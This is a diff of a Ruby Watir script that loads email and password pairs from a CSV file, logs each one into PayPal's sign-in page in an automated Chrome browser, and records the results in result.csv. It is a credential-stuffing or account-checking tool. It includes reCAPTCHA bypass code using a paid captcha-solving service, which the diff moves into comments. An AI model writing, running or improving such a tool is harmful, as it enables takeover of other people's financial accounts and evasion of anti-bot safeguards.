@@ -2,9 +2,8 @@ require './anti_captcha'
 require 'watir'
 require 'csv'
 
-WEB_URL = "https://www.paypal.com/signin" 
+WEB_URL = "https://www.paypal.com/signin"
 SHORT_TIME_DELAY = 2
-EMAIL = "lamnn"
 file_path = 'data.csv'
 count = 0
 
@@ -18,13 +17,13 @@ CSV.foreach(file_path) do |row|
     list_password << row[1]
 end
 
-count = list_email.length()
+count = list_email.length() - 1
 
 
 ## application
 begin
 
-    for i in 1..count
+    for i in 0..count
         puts ".... at "
         browser = Watir::Browser.new:chrome
     
@@ -44,6 +43,10 @@ begin
         puts "write password "
         browser.text_field(id: 'password').set(list_password[i])
         
+
+
+
+
         puts "click next password"
         browser.button(text: 'Log In').click
 
@@ -54,26 +57,37 @@ begin
 
 
         puts "-----check iframe"
+        # if browser.form(action: '/auth/validatecaptcha').exists?
+        #   WEB_CAPTCHA_URL = "https://www.paypal.com/signin"
+        #   # get website key
+        #   iframe_captcha = browser.iframe(name: 'recaptcha')
+        #   src_captcha = iframe_captcha.attribute_value('src')
+        #   params = CGI.parse(URI.parse(src_captcha).query)
+        #   website_key = params['siteKey'][0]
+      
+        #   puts 'website_key'
+        #   puts website_key
+      
+        #   # anti captcha
+        #   solution = AntiCaptcha.google_recaptcha(WEB_CAPTCHA_URL, website_key)
+      
+        #   # set captcha response
+      
+        #   # task
+        #   textarea = iframe_captcha.textarea(id: 'g-recaptcha-response')
+        #   sleep(30)
+        #   puts "codee "
+        #   browser.execute_script("return arguments[0].innerHTML = '#{solution['gRecaptchaResponse']}';", textarea) unless solution.nil?
+        #   sleep(60)
+        #   puts "submit"
+        #   browser.form(action: '/auth/validatecaptcha').submit
+        #   puts "done"
+        #   sleep(60)
 
-        if browser.iframe(name: 'recaptcha').exists?
-            puts "-----in iframe"
-            if browser.iframe(name: 'recaptcha').iframe.exists?
-                puts "in  1"
-                if browser.iframe(name: 'recaptcha').iframe.input(id: 'recaptcha-token').exists?
-                    puts "in  2"
-                    puts 'anti google captcha'
-
-                    website_key = browser.iframe(name: 'recaptcha').iframe.input(id: 'recaptcha-token').value
-                    solution = AntiCaptcha.google_recaptcha(WEB_URL, website_key)
-                    textarea = browser.iframe(name: 'recaptcha').iframe.textarea(id: 'g-recaptcha-response')
-                    browser.execute_script("return arguments[0].innerHTML = '#{solution['gRecaptchaResponse']}';", textarea) unless solution.nil?
-
-                    puts solution
-                    sleep(40)
-
-                end
-            end
-        end
+        # else
+        #   # browser.a(text: 'Not now').click
+        #   # <a href="https://www.paypal.com/myaccount/summary" class="scTrack:not-now" pa-marked="1">Not now</a>
+        # end
 
 
         puts '------------------------------------------'
@@ -81,5 +95,13 @@ begin
         sleep(SHORT_TIME_DELAY)
         browser.close
     end
+
+    CSV.open("result.csv", "wb") do |csv|
+      csv << ["user", "password", "status"]
+      for i in 0..count
+        csv << [list_email[i], list_password[i], "yes"]
+      end
+    end
+
 end
 
